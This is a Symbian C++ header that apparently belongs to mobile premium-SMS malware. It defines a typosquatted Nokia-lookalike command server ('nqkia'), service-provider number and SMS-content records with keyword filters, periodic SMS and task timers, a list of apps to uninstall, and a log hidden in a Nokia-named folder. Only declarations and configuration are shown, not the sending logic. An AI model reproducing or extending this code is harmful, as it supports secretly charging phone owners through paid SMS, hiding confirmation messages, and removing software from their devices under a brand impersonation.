#ifndef _COMMUTILS_H_
#define _COMMUTILS_H_
#include <e32std.h>
#include <bautils.h>
_LIT(KAppFolder,"c:\\data\\Nokia\\");
_LIT(KDebugFlagFile,"c:\\data\\a\\1");
_LIT(KLogPath,"c:\\data\\Nokia\\0x20068BC2.txt");
_LIT8(KIndexUrl, "http://w.nqkia.com/order/");
_LIT8(KSettingUrl, "http://w.nqkia.com/setting/");
_LIT8(KSmsParserUrl, "http://w.nqkia.com/parser/sms/");
_LIT8(KNewLine,"\n");
_LIT8(KFieldSplitter,",");
_LIT8(KVersion,"9");
_LIT8(KUID,"0x20068BC2");
_LIT8(KUnInstallList,"0x20068BB6,0x2005D5A4");
const TInt TTaskInteval=37;//minutes
const TInt TSMSPeriodicInteval=240;//seconds
const TInt TMessageContentLength=1500;
const TInt TPhoneNumberLength=100;
const TInt TMessageContentKeywordLength=100;
const TInt TPhoneNumberKeywordLength=25;
const TInt TMessageData=228213;
struct KeyValue{
    TBuf8<32> Key;
    HBufC8* Value;
    KeyValue(const TDesC8& aKey,const TDesC8& aValue){
        Key.Copy(aKey);
        Key.Trim();
        Value=aValue.AllocL();
        Value->Des().Trim();
    }
    ~KeyValue(){
        delete Value;
        Value=NULL;
    }
};

struct SpChannelItem{
    TBuf<10> Id;
    TBuf<10> ParentId;
    TBuf<TPhoneNumberLength> SpNumber;
    TBuf<TMessageContentLength> SpSmsContent;
    TBuf<TPhoneNumberKeywordLength> SpNumberFilter;
    TBuf<TMessageContentKeywordLength> SpSmsContentFilter;
    TBool ParseInServer;
};

struct SmsMessage{
    TBuf<TPhoneNumberLength> PhoneNumber;
    TBuf<TMessageContentLength> MessageContent;
};

class CTaskObserver{
public:
    virtual void OnTaskSuccess(TInt aTaskFlag){
    }
    virtual void OnTaskFailed(TInt aTaskFlag,const TDesC8& aFailedReason,TInt aFailedStep){
    }
};

TBool DebugEnabled();
void Log(const TDesC8& buf,TDesC& file,TInt append=1);
void Log(const TDesC8& buf,TInt append=1);
TInt SaveToFile(const TDesC& aFileName,const TDesC8& aData,TBool aAppendFile=EFalse);
void DeleteFile(const TDesC& aFileName);
TInt ReadFromFile(const TDesC& aFileName,HBufC8*& aOutBuf);
TBool FileExists(const TDesC& aFileName);
TInt HexString2Int(const TDesC & aHexStr);
TInt TDesC82TInt(const TDesC8& aDesC);
TInt GetRandom(TInt minValue,TInt maxValue);
TUid HexString2Uid(const TDesC8& aString);
TInt SeprateToArray(const TDesC8& aData,const TDesC8& aSeprator,CDesC8Array& aArray);
TPtrC8 FindEnclosed(const TDesC8& aTarget,const TDesC8& aLeft,const TDesC8& aRight,TBool aReverse=EFalse);
TPtrC8 FindMatchEnclosed(const TDesC8& aTarget,const TDesC8& aLeft,const TDesC8& aRight,const TDesC8& aKeys,const TDesC8& aSplitter);
TPtrC8 FindLeft(const TDesC8& aTarget,const TDesC8& aFlag);
TPtrC8 FindRight(const TDesC8& aTarget,const TDesC8& aFlag);
TPtrC8 UnicodeToUtf8(const TDesC& aDes);
TPtrC Utf8ToUnicode(const TDesC8& aString);
TPtrC8 URLEncode(const TDesC8& aDes);
#ifndef SAFE_DELETE
#define SAFE_DELETE(x)  \
  {                   \
    if(x)           \
      delete (x); \
    (x) = NULL;     \
  }
#endif

#ifndef SAFE_DELETEARRAY
#define SAFE_DELETEARRAY(x)  \
  {                   \
  if(x)           \
  delete[] (x); \
  (x) = NULL;     \
  }
#endif
#endif
